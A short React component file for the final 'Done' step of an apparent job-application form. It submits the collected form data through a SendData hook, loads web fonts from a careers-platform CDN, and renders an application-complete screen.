import React, { useContext } from "react";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";
import ApplicationComplete from "../frriSpecific/ApplicationComplete.js";

function Done() {
  let { AllData } = useContext(DataContext);

  React.useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "Done",
    };
    SendData(params);
  }, []);

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#fff", fontFamily: "'Roboto-Regular', 'Helvetica Neue', Arial, sans-serif" }}>
      <style>{`
        @font-face {
          src: url(https://pp-cdn.phenompeople.com/CareerConnectResources/prod/NBDSUS/canvas/font/font-1789923632124.woff2) format('woff2');
          font-weight: 400;
          font-display: swap;
          font-family: 'Roboto-Regular';
          font-style: normal;
        }
        @font-face {
          src: url(https://pp-cdn.phenompeople.com/CareerConnectResources/prod/NBDSUS/canvas/font/font-1789551740936.woff2) format('woff2');
          font-weight: 400;
          font-display: swap;
          font-family: 'Roboto-Medium';
          font-style: normal;
        }
        @font-face {
          src: url(https://pp-cdn.phenompeople.com/CareerConnectResources/prod/NBDSUS/canvas/font/font-1789551740162.woff2) format('woff2');
          font-weight: 300;
          font-display: swap;
          font-family: 'Roboto-Light';
          font-style: normal;
        }
        @font-face {
          src: url(https://pp-cdn.phenompeople.com/CareerConnectResources/prod/NBDSUS/canvas/font/font-1789551739473.woff2) format('woff2');
          font-weight: 400;
          font-display: swap;
          font-family: 'Action NBA-Regular';
          font-style: normal;
        }
      `}</style>

      <main style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", paddingTop: "50px" }}>
        <ApplicationComplete />
      </main>
    </div>
  );
}

export default Done;
